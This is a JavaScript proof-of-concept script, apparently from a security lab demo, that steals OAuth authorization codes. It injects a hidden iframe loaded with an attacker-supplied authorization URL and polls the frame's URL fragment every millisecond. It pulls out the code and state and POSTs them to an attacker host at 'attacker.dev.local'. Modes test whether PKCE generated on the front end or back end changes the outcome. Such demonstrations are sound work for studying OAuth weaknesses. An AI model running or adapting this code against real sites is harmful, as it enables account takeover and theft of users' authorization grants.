// Iframe with PKCE, code verifier, state and nonce are generated on the backend

const ATTACKER_HOST = 'https://attacker.dev.local:5443'
const MODE = 'pkce-back' // 'default' | 'pkce-front' | 'pkce-back'

async function getAttackersAuthorizationRequestURL(mode) {
    let queryParams;
    if (mode) {
        queryParams = `?mode=${mode}`
    }
    else {
        queryParams = ''
    }
    let response = await fetch(`${ATTACKER_HOST}/oauth-params${queryParams}`);
    response = await response.json();
    return response.attackers_url;
}

function injectIframe(url) {
    let ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.style.width = "1px";
    ifrm.style.height = "1px";
    ifrm.style.display = "none";
    ifrm.setAttribute("id", 'test');
    document.body.appendChild(ifrm);
    return ifrm;
}

async function stealAuthorizationResponse(frameObj, timerRef) {
    let hash = frameObj?.contentDocument?.location?.hash;
    if (hash.includes("code")) {
        frameObj.contentWindow.stop();
        clearInterval(timerRef);
        let code = hash.split('code=')[1];
        let state = hash.split('state=')[1].split('&')[0];
        response = await sendAuthorizationResponseToAttacker(code, state, `${ATTACKER_HOST}/authorization-response?mode=${MODE}`);
        if (response?.error === true) {
            return false;
        }
        console.log(`Authorization code: ${code}\nand state: ${state}\nsent to the attacker`);
    }

}

async function sendAuthorizationResponseToAttacker(code, state, maliciousUrl) {
    let body = {
        code: code,
        state: state
    }
    let response = await fetch(maliciousUrl, {
        method: 'POST', headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });
    response = await response.json();
    return response;
}

(async function () {
    let url = await getAttackersAuthorizationRequestURL(MODE);
    let ifrm = injectIframe(url);
    let timer = setInterval(() => stealAuthorizationResponse(ifrm, timer), 1);

    // fallback
    setTimeout(() => {
        clearInterval(timer);
    }, 5000);
})();
